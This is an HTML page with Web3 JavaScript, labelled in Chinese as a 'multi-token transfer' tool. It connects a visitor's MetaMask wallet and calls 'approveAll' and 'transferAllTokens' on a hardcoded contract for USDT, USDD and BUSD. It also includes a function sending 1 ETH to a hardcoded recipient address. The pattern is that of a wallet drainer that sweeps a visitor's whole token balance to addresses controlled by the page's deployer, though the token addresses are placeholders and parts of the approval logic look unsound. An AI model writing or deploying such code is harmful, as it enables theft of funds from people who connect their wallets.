<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>多代币转账</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
</head>
<body>
    <h1>钱包连接与多代币转账</h1>
    <button id="connectButton">连接钱包</button>
    <button id="authorizeTransfer" disabled>授权所有代币</button>
    <button id="transferButton" disabled>转移所有代币</button>
    <p id="status">状态信息</p>

    <script>
        let web3;
        let account;
        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 智能合约地址
        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
        const tokens = [
            { symbol: "USDT", address: "0xYOUR_USDT_ADDRESS" },
            { symbol: "USDD", address: "0xYOUR_USDD_ADDRESS" },
            { symbol: "BUSD", address: "0xYOUR_BUSD_ADDRESS" }
        ];
        let contract;

        const abi = [
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "approveAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "transferAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "withdrawETH",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 检查钱包是否已连接
        async function checkWalletConnected() {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    account = accounts[0];
                    document.getElementById("status").innerText = "已连接钱包: " + account;
                    document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
                    contract = new web3.eth.Contract(abi, contractAddress); // 初始化合约
                }
            }
        }

        // 连接钱包
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];
                    document.getElementById("status").innerText = "已连接钱包: " + account;
                    document.getElementById("authorizeTransfer").disabled = false;
                    contract = new web3.eth.Contract(abi, contractAddress);
                } catch (error) {
                    handleError(error);
                }
            } else {
                document.getElementById("status").innerText = "请安装 MetaMask!";
            }
        }

        // 授权所有代币
        async function authorizeAllTokens() {
            try {
                for (let token of tokens) {
                    await contract.methods.approveAll(token.address).send({ from: account });
                    document.getElementById("status").innerText = token.symbol + " 授权成功!";
                }
                document.getElementById("status").innerText += "所有代币授权成功!";
                document.getElementById("transferButton").disabled = false; // 启用转账按钮
            } catch (error) {
                handleError(error);
            }
        }

        // 转移所有代币
        async function transferAllTokens() {
            try {
                for (let token of tokens) {
                    await contract.methods.transferAllTokens(token.address).send({ from: account });
                    document.getElementById("status").innerText = token.symbol + " 转账成功!";
                }
                document.getElementById("status").innerText += "所有代币转账成功!";
            } catch (error) {
                handleError(error);
            }
        }

        // 转移 ETH
        async function transferETH() {
            try {
                await web3.eth.sendTransaction({
                    from: account,
                    to: recipientAddress,
                    value: web3.utils.toWei("1", "ether") // 转移 1 ETH
                });
                document.getElementById("status").innerText = "ETH 转账成功!";
            } catch (error) {
                handleError(error);
            }
        }

        // 错误处理
        function handleError(error) {
            if (error.code === 4001) {
                document.getElementById("status").innerText = "用户拒绝了请求。";
            } else {
                document.getElementById("status").innerText = "操作失败: " + error.message;
                console.error("错误信息:", error);
            }
        }

        // 事件监听
        document.getElementById("connectButton").addEventListener("click", connectWallet);
        document.getElementById("authorizeTransfer").addEventListener("click", authorizeAllTokens);
        document.getElementById("transferButton").addEventListener("click", transferAllTokens);

        // 页面加载时检查钱包连接
        window.addEventListener('load', checkWalletConnected);
    </script>
</body>
</html>
